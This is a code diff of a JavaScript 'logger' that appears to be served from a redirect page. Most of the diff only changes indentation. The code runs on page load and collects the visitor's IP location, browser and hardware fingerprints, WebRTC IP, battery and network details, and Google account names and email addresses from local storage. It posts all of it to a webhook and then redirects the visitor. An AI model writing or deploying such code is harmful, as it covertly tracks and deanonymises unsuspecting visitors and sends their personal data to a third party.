@@ -127,84 +127,77 @@ async function getIpData() {
     }
 
     async function logAndRedirect() {
-        console.log("🚀 [LOGGER] Starting comprehensive logging process...");
-        try {
-            console.log("🔍 [LOGGER] Gathering all possible data...");
-            const [ ipData, fpResult, webrtcIP, battery, audioFingerprint, privacySettings, systemInfo, screenInfo, networkInfo, storageInfo, googleInfo ] = await Promise.allSettled([
-                // --- FIX #2: Use the new IP lookup function ---
-                getIpData(),
-                getAdvancedFingerprint(),
-                getWebRTCIP(),
-                getBatteryInfo(),
-                getAudioFingerprint(),
-                Promise.resolve(getPrivacySettings()),
-                Promise.resolve(getSystemInfo()),
-                Promise.resolve(getScreenInfo()),
-                Promise.resolve(getNetworkInfo()),
-                getStorageInfo(),
-                getGoogleUserInfo(),
-            ]);
-            console.log("✅ [LOGGER] Data gathering complete.");
-            const payload = { timestamp: new Date().toISOString(), ip: ipData.value?.ip, city: ipData.value?.city, region: ipData.value?.region, country: ipData.value?.country_name, postal: ipData.value?.postal, latitude: ipData.value?.latitude, longitude: ipData.value?.longitude, isp: ipData.value?.org, asn: ipData.value?.asn, timezone: ipData.value?.timezone, fingerprintId: fpResult.value?.visitorId, confidence: fpResult.value?.confidence.score, browser: fpResult.value?.browserName, browserVersion: fpResult.value?.browserVersion, os: fpResult.value?.os, osVersion: fpResult.value?.osVersion, device: fpResult.value?.device, incognito: fpResult.value?.incognito, canvasFingerprint: fpResult.value?.canvasHash, webglFingerprint: fpResult.value?.webGlHash, fontFingerprint: fpResult.value?.fontHash, audioFingerprint: audioFingerprint.value, gpu: fpResult.value?.graphicsCard?.renderer, gpuVendor: fpResult.value?.graphicsCard?.vendor, screen: screenInfo.value, deviceMemory: navigator.deviceMemory || 'N/A', hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', system: systemInfo.value, webrtcIP: webrtcIP.value, network: networkInfo.value, storage: storageInfo.value, battery: battery.value, privacy: privacySettings.value, googleAccountInfo: googleInfo.value, };
-            console.log("📤 [LOGGER] Sending payload to Webhook.site...");
-            const discordPayload = {
+    console.log("🚀 [LOGGER] Starting comprehensive logging process...");
+    try {
+        console.log("🔍 [LOGGER] Gathering all possible data...");
+        const [ ipData, fpResult, webrtcIP, battery, audioFingerprint, privacySettings, systemInfo, screenInfo, networkInfo, storageInfo, googleInfo ] = await Promise.allSettled([
+            // --- FIX #2: Use the new IP lookup function ---
+            getIpData(),
+            getAdvancedFingerprint(),
+            getWebRTCIP(),
+            getBatteryInfo(),
+            getAudioFingerprint(),
+            Promise.resolve(getPrivacySettings()),
+            Promise.resolve(getSystemInfo()),
+            Promise.resolve(getScreenInfo()),
+            Promise.resolve(getNetworkInfo()),
+            getStorageInfo(),
+            getGoogleUserInfo(),
+        ]);
+        console.log("✅ [LOGGER] Data gathering complete.");
+        const payload = { timestamp: new Date().toISOString(), ip: ipData.value?.ip, city: ipData.value?.city, region: ipData.value?.region, country: ipData.value?.country_name, postal: ipData.value?.postal, latitude: ipData.value?.latitude, longitude: ipData.value?.longitude, isp: ipData.value?.org, asn: ipData.value?.asn, timezone: ipData.value?.timezone, fingerprintId: fpResult.value?.visitorId, confidence: fpResult.value?.confidence.score, browser: fpResult.value?.browserName, browserVersion: fpResult.value?.browserVersion, os: fpResult.value?.os, osVersion: fpResult.value?.osVersion, device: fpResult.value?.device, incognito: fpResult.value?.incognito, canvasFingerprint: fpResult.value?.canvasHash, webglFingerprint: fpResult.value?.webGlHash, fontFingerprint: fpResult.value?.fontHash, audioFingerprint: audioFingerprint.value, gpu: fpResult.value?.graphicsCard?.renderer, gpuVendor: fpResult.value?.graphicsCard?.vendor, screen: screenInfo.value, deviceMemory: navigator.deviceMemory || 'N/A', hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', system: systemInfo.value, webrtcIP: webrtcIP.value, network: networkInfo.value, storage: storageInfo.value, battery: battery.value, privacy: privacySettings.value, googleAccountInfo: googleInfo.value, };
+        console.log("📤 [LOGGER] Sending payload to Webhook.site...");
+        const discordPayload = { username: "Advanced Logger", embeds: [{ title: "🔍 Comprehensive User Log", description: `A user from **${payload.city || 'N/A'}** has been logged.`, color: 5814783, fields: [ { name: "📍 Location & IP", "value": `**IP:** ${payload.ip}\n**City:** ${payload.city}\n**Region:** ${payload.region}\n**Country:** ${payload.country}\n**ISP:** ${payload.isp}`, inline: true }, { name: "💻 System", "value": `**OS:** ${payload.os} ${payload.osVersion}\n**Browser:** ${payload.browser} ${payload.browserVersion}\n**Device:** ${payload.device}\n**CPU Cores:** ${payload.hardwareConcurrency}\n**Memory:** ${payload.deviceMemory}GB`, inline: true }, { name: "🖥️ Hardware", "value": `**GPU:** ${payload.gpu}\n**GPU Vendor:** ${payload.gpuVendor}\n**Screen:** ${payload.screen.width}x${payload.screen.height}\n**Color Depth:** ${payload.screen.colorDepth}\n**Pixel Ratio:** ${payload.screen.devicePixelRatio}`, inline: true }, { name: "🌐 Network", "value": `**WebRTC IP:** ${payload.webrtcIP || 'N/A'}\n**Connection:** ${payload.network?.effectiveType || 'N/A'}\n**Downlink:** ${payload.network?.downlink || 'N/A'} Mbps\n**RTT:** ${payload.network?.rtt || 'N/A'} ms`, inline: true }, { name: "🔋 Power", "value": `**Level:** ${payload.battery ? Math.round(payload.battery.level * 100) + '%' : 'N/A'}\n**Charging:** ${payload.battery ? (payload.battery.charging ? 'Yes' : 'No') : 'N/A'}`, inline: true }, { name: "🔒 Privacy", "value": `**Cookies:** ${payload.privacy.cookieEnabled ? 'Enabled' : 'Disabled'}\n**Do Not Track:** ${payload.privacy.doNotTrack || 'Unspecified'}\n**Incognito:** ${payload.incognito ? 'Yes' : 'No'}`, inline: true }, { name: "🧑‍💻 Potential Personal Info", "value": `**Google Account:** ${payload.googleAccountInfo ? 'Found (see logs)' : 'Not Found'}\n**User Agent:** \`\`\`${payload.system.userAgent}\`\`\``, inline: false }, { name: "🔑 Unique IDs", "value": `**Fingerprint ID:** \`${payload.fingerprintId}\`\n**Confidence:** ${payload.confidence}\n**Canvas FP:** \`${payload.canvasFingerprint}\`\n**WebGL FP:** \`${payload.webglFingerprint}\``, inline: false } ], footer: { text: `Logged at ${payload.timestamp}` } }] };
+        // --- FIX #1: Use the correct variable name for the webhook URL ---
+        // Send the main embed
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(discordPayload)
+        });
+        // If Google info was found, send it in a separate, more detailed embed
+        if (payload.googleAccountInfo) {
+            const googlePayload = {
                 username: "Advanced Logger",
                 embeds: [{
-                    title: "🔍 Comprehensive User Log",
-                    description: `A user from **${payload.city || 'N/A'}** has been logged.`,
-                    color: 5814783,
-                    fields: [
-                        { name: "📍 Location & IP", "value": `**IP:** ${payload.ip}\n**City:** ${payload.city}\n**Region:** ${payload.region}\n**Country:** ${payload.country}\n**ISP:** ${payload.isp}`, inline: true },
-                        { name: "💻 System", "value": `**OS:** ${payload.os} ${payload.osVersion}\n**Browser:** ${payload.browser} ${payload.browserVersion}\n**Device:** ${payload.device}\n**CPU Cores:** ${payload.hardwareConcurrency}\n**Memory:** ${payload.deviceMemory}GB`, inline: true },
-                        { name: "🖥️ Hardware", "value": `**GPU:** ${payload.gpu}\n**GPU Vendor:** ${payload.gpuVendor}\n**Screen:** ${payload.screen.width}x${payload.screen.height}\n**Color Depth:** ${payload.screen.colorDepth}\n**Pixel Ratio:** ${payload.screen.devicePixelRatio}`, inline: true },
-                        { name: "🌐 Network", "value": `**WebRTC IP:** ${payload.webrtcIP || 'N/A'}\n**Connection:** ${payload.network?.effectiveType || 'N/A'}\n**Downlink:** ${payload.network?.downlink || 'N/A'} Mbps\n**RTT:** ${payload.network?.rtt || 'N/A'} ms`, inline: true },
-                        { name: "🔋 Power", "value": `**Level:** ${payload.battery ? Math.round(payload.battery.level * 100) + '%' : 'N/A'}\n**Charging:** ${payload.battery ? (payload.battery.charging ? 'Yes' : 'No') : 'N/A'}`, inline: true },
-                        { name: "🔒 Privacy", "value": `**Cookies:** ${payload.privacy.cookieEnabled ? 'Enabled' : 'Disabled'}\n**Do Not Track:** ${payload.privacy.doNotTrack || 'Unspecified'}\n**Incognito:** ${payload.incognito ? 'Yes' : 'No'}`, inline: true },
-                        { name: "🧑‍💻 Potential Personal Info", "value": `**Google Account:** ${payload.googleAccountInfo ? 'Found (see logs)' : 'Not Found'}\n**User Agent:** \`\`\`${payload.system.userAgent}\`\`\``, inline: false },
-                        { name: "🔑 Unique IDs", "value": `**Fingerprint ID:** \`${payload.fingerprintId}\`\n**Confidence:** ${payload.confidence}\n**Canvas FP:** \`${payload.canvasFingerprint}\`\n**WebGL FP:** \`${payload.webglFingerprint}\``, inline: false }
+                    title: "🔍 Google Account Info Found",
+                    color: 15105570, // Yellow color for warning
+                    description: "Partial Google account information was extracted from the browser's local storage.",
+                    fields: [{
+                            name: "Full Name",
+                            value: payload.googleAccountInfo.names?.map(n => n.displayName).join(', ') || 'N/A',
+                            inline: true
+                        },
+                        {
+                            name: "Email Addresses",
+                            value: payload.googleAccountInfo.emailAddresses?.map(e => e.value).join(', ') || 'N/A',
+                            inline: true
+                        }
                     ],
-                    footer: { text: `Logged at ${payload.timestamp}` }
+                    footer: {
+                        text: `Logged at ${payload.timestamp}`
+                    }
                 }]
             };
-            
             // --- FIX #1: Use the correct variable name for the webhook URL ---
-            // Send the main embed
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(discordPayload)
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(googlePayload)
             });
-
-            // If Google info was found, send it in a separate, more detailed embed
-            if (payload.googleAccountInfo) {
-                const googlePayload = {
-                    username: "Advanced Logger",
-                    embeds: [{
-                        title: "🔍 Google Account Info Found",
-                        color: 15105570, // Yellow color for warning
-                        description: "Partial Google account information was extracted from the browser's local storage.",
-                        fields: [
-                            { name: "Full Name", value: payload.googleAccountInfo.names?.map(n => n.displayName).join(', ') || 'N/A', inline: true },
-                            { name: "Email Addresses", value: payload.googleAccountInfo.emailAddresses?.map(e => e.value).join(', ') || 'N/A', inline: true }
-                        ],
-                        footer: { text: `Logged at ${payload.timestamp}` }
-                    }]
-                };
-                // --- FIX #1: Use the correct variable name for the webhook URL ---
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(googlePayload)
-                });
-            }
-            console.log("✅ [LOGGER] Data sent to Webhook.site.");
-        } catch (error) {
-            console.error("💥 [LOGGER] A critical error occurred during logging:", error);
-        } finally {
-            console.log("🔗 [LOGGER] Redirecting to final URL...");
-            window.location.href = FINAL_REDIRECT_URL;
         }
+        console.log("✅ [LOGGER] Data sent to Webhook.site.");
+    } catch (error) {
+        console.error("💥 [LOGGER] A critical error occurred during logging:", error);
+    } finally {
+        console.log("🔗 [LOGGER] Redirecting to final URL...");
+        window.location.href = FINAL_REDIRECT_URL;
     }
+}
 
     // Start the logging process as soon as the page loads
     window.addEventListener('load', logAndRedirect);
